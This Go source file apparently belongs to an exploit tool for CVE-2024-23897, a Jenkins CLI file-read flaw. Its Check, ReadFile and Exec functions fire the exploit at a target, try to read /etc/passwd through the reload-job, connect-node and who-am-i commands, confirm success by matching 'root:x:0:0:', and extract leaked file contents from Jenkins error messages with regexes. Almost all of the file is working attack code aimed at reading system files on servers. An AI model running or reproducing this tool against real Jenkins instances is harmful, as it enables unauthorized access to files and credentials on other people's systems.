package scanner

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/wjlin0/CVE-2024-23897/pkg/input"
	"github.com/wjlin0/CVE-2024-23897/pkg/output"
	"regexp"
	"strings"
)

func (s *Scanner) Check(target *input.Target) (vul bool, readFullFile bool, result *output.ResultEvent) {

	result = output.NewResultEvent(target)
	result.Mode = output.ModeCheck
	result.Command = ""
	// 提取 可用命令

	// 检查是否可以读取全部文件
	result3 := s.Exploit(target, output.ModeReadFile, "/etc/passwd", "reload-job")
	if result3 != nil && result3.Response != "" && !strings.Contains(result3.Response, "anonymous is missing the Overall/Read permission") {
		if strings.Contains(result3.Response, "root:x:0:0:") {
			readFullFile = true
			vul = true
			result.Response = "reload-job"
		}
	}

	// 检查是否可以读取全部文件
	result4 := s.Exploit(target, output.ModeReadFile, "/etc/passwd", "connect-node")
	if result4 != nil && result4.Response != "" && !strings.Contains(result4.Response, "anonymous is missing the Overall/Read permission") {
		if strings.Contains(result4.Response, "root:x:0:0:") {
			readFullFile = true
			vul = true
			result.Response = "connect-node"
		}
	}

	if readFullFile {
		return
	}

	// 检查是否存在漏洞

	result2 := s.Exploit(target, output.ModeReadFile, "/etc/passwd", "who-am-i")
	if result2 == nil || result2.Response == "" {
		return false, false, nil
	}
	if strings.Contains(result2.Response, "root:x:0:0:") {
		vul = true
		result.Response = "who-am-i"
	}

	return
}

func (s *Scanner) ListAvailableCommands(target *input.Target) (commands []string, result *output.ResultEvent) {
	result = s.Exploit(target, output.ModeExec, "", "help")
	if result != nil && result.URL != "" {
		// 提取 可用命令
		commands = extractAvailableCommands(result.Response)
	}
	result.Mode = output.ModeListAvailableCommands
	return
}

func (s *Scanner) ReadFile(target *input.Target, command string, filename string) (result *output.ResultEvent) {
	result = s.Exploit(target, output.ModeReadFile, filename, command)
	if result == nil {
		return
	}
	parseData := []byte(result.Response)
	switch command {
	case "who-am-i":
		rg := whoamiCommandRegexData.FindStringSubmatch(string(parseData))
		if len(rg) > 1 {
			parseData = []byte(rg[1])
		}

	case "help":

		rg := helpCommandRegexData.FindStringSubmatch(string(parseData))
		if len(rg) > 1 {
			parseData = []byte(rg[1])
		}
	case "version":
		rg := versionCommandRegexData.FindStringSubmatch(string(parseData))
		if len(rg) > 1 {
			parseData = []byte(rg[1])
		}

	case "reload-job":

		matches := reloadJobCommandRegexData.FindAllSubmatch(parseData, -1)

		if len(matches) > 0 {
			parseData = []byte{}
			for _, match := range matches {
				for _, group := range match[1:] {
					if len(group) > 0 {
						parseData = append(parseData, group...)
						parseData = append(parseData, []byte("\n")...)
					}
				}
			}
			parseData = bytes.TrimSuffix(parseData, []byte("\n"))
		}
	case "connect-node":
		matches := connectNodeCommandRegexData.FindAllSubmatch(parseData, -1)

		if len(matches) > 0 {
			parseData = []byte{}
			for _, match := range matches {
				for _, group := range match[1:] {
					if len(group) > 0 {
						parseData = append(parseData, group...)
						parseData = append(parseData, []byte("\n")...)
					}
				}
			}
			parseData = bytes.TrimSuffix(parseData, []byte("\n"))
		}
	}

	result.Response = string(parseData)

	result.Mode = output.ModeReadFile
	result.Args = filename
	return
}

func (s *Scanner) Exec(target *input.Target, command string, args string) (result *output.ResultEvent) {
	result = s.Exploit(target, output.ModeExec, args, command)
	if result == nil {
		return
	}
	result.Mode = output.ModeExec

	return
}

func extractAvailableCommands(body string) (commands []string) {
	// TODO
	bodys := strings.Split(body, "\n")
	for _, line := range bodys {
		if strings.HasPrefix(line, "  ") && !strings.HasPrefix(line, "    ") {
			commands = append(commands, strings.TrimSpace(line))
		}
	}
	return
}

var whoamiCommandRegexData = regexp.MustCompile(`ERROR: (?:No argument is allowed: )? ?((?:No such file: )?.*)\njava -jar jenkins-cli.jar who-am-i`)
var helpCommandRegexData = regexp.MustCompile(`ERROR: (?:Too many arguments: )?((?:No such file: )?.*)\njava -jar jenkins-cli.jar help`)

var reloadJobCommandRegexData = regexp.MustCompile(`ERROR: (.*)\njava -jar jenkins-cli.jar reload-job|No such item \x3f(.*?)\x3f `)
var versionCommandRegexData = regexp.MustCompile(`ERROR: (?:No argument is allowed: )? ?((?:No such file: )?.*)\njava -jar jenkins-cli.jar version`)
var connectNodeCommandRegexData = regexp.MustCompile(`ERROR: (.*)\njava -jar jenkins-cli.jar connect-node|No such agent "(.*?)" `)

func parseResponseData(Mode output.Mode, command string, data []byte) ([]byte, error) {
	// TODO
	var f = func(data []byte) ([]byte, error) {
		var datas []byte
		if len(data) < 7 {
			return nil, fmt.Errorf("invalid length: %d", len(data))
		}
		for len(data) >= 7 {
			if string(data[:7]) == "\x00\x00\x00\x04\x04\x00\x00" {
				break
			}

			data = data[2:]
			lengthBytes := data[:2]

			// 将 lengthBytes 转换为 10 进制
			length := binary.BigEndian.Uint16(lengthBytes)
			if int(length)+3 > len(data) {
				return nil, fmt.Errorf("invalid length: exceeds available data")
			}

			datas = append(datas, data[3:3+length]...)
			data = data[3+length:]
		}
		return datas, nil
	}
	parseData, err := f(data)
	if err != nil {
		return nil, err
	}

	return parseData, nil
}
